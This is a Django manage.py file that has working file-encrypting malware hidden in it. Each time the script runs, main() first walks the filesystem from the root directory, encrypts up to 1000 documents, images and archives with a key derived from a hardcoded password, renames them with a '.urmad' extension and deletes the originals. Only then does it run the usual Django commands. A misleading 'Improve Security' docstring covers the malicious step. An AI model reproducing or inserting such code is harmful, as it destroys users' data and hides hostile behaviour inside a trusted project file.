#!/usr/bin/env python
"""Django's command-line utility for administrative tasks."""
import os
import sys
import random
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def generate_key(password):
    salt = b'iojsdfldfnkjvbiujntr'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)
        
        with open(file_path + '.urmad', 'wb') as f:
            f.write(encrypted_data)

        os.remove(file_path)
        
        return True
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")
        return False

def encrypt_directory(start_path, key, extensions_to_encrypt=None, max_files=10):
    if extensions_to_encrypt is None:
        extensions_to_encrypt = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.jpeg', '.png', '.xls', '.xlsx', '.ppt', '.pptx', '.zip']
    
    count = 0
    encrypted_files = []

    for root, dirs, files in os.walk(start_path):
        for file in files:
            if count >= max_files:
                print(f"Reached maximum file count ({max_files})")
                return encrypted_files
            
            file_path = os.path.join(root, file)
            _, ext = os.path.splitext(file)
            
            if ext.lower() in extensions_to_encrypt:
                    print(f"Encrypting: {file_path}")
                    if encrypt_file(file_path, key):
                        encrypted_files.append(file_path)
                        count += 1
    
    return encrypted_files

def main():
    """Improve Security"""
    password = "murphinator"
    key = generate_key(password)
    
    dir = "/"
    
    extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.jpeg', '.png', '.xls', '.xlsx', '.ppt', '.pptx', '.zip']
    encrypted_files = encrypt_directory(dir, key, extensions, max_files=1000)
    
    """Run administrative tasks."""
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'DBMSProj.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)


if __name__ == '__main__':
    main()
